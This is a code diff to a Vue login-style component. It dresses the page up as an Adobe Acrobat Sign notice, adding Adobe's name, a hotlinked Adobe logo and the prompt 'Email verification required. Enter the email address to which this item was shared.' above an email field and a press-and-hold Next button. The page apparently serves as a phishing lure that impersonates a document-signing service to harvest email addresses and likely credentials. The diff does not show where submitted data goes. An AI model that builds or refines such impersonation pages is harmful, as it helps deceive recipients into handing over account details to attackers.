@@ -4,14 +4,21 @@
       <div class="sign-card">
         <div class="header">
           <div class="logo-text">
-          
+            <span class="person-icon">⼈</span>
+            Adobe Acrobat Sign
+          </div>
+          <img
+            class="adobe-logo"
+            src="https://na4.documents.adobe.com/images/emailNextGen/email-adobe-tag-classic@2x.png"
+            alt="Adobe Logo"
+          />
         </div>
 
         <div class="success-check">✓</div>
 
         <div class="content">
           <p><strong>Email verification required.</strong></p>
-          <p>
+          <p>Enter the email address to which this item was shared.</p>
           <input
             v-model="email"
             type="email"
@@ -30,6 +37,7 @@
           @touchstart.prevent="startHold"
           @touchend.prevent="endHold"
           :disabled="loading"
+          class="action-button"
         >
           {{ loading ? 'Verifying…' : 'Next' }}
         </button>
@@ -126,7 +134,7 @@ function cancelHold() {
   padding: 2rem;
 }
 
-.sign-card .header {
+.header {
   display: flex;
   justify-content: space-between;
   align-items: center;
@@ -142,30 +150,46 @@ function cancelHold() {
   margin-right: 0.5rem;
 }
 
+.adobe-logo {
+  height: 24px;
+}
+
+.success-check {
+  font-size: 2rem;
+  color: green;
+  text-align: center;
+  margin: 1rem 0;
+}
+
+.content p {
+  margin: 0.5rem 0;
+}
+
 .email-input {
-  width: 90%;
+  width: 100%;
   padding: 0.5rem;
   margin: 1rem 0;
   border: 1px solid #ccc;
   border-radius: 5px;
 }
 
-button {
+.action-button {
   background-color: #0051c3;
   color: white;
   padding: 0.6rem 1.2rem;
   border: none;
   border-radius: 5px;
   cursor: pointer;
-  width: 65%;
+  width: 100%;
+  margin-top: 0.5rem;
 }
 
-button:disabled {
+.action-button:disabled {
   opacity: 0.6;
   cursor: default;
 }
 
-button:hover:not(:disabled) {
+.action-button:hover:not(:disabled) {
   background-color: #003a91;
 }
 
@@ -189,12 +213,5 @@ button:hover:not(:disabled) {
 .error {
   color: red;
   font-size: 0.9rem;
-}
-
-.success-check {
-  font-size: 2rem;
-  color: green;
-  text-align: center;
-  margin: 1rem 0;
 }
 </style>
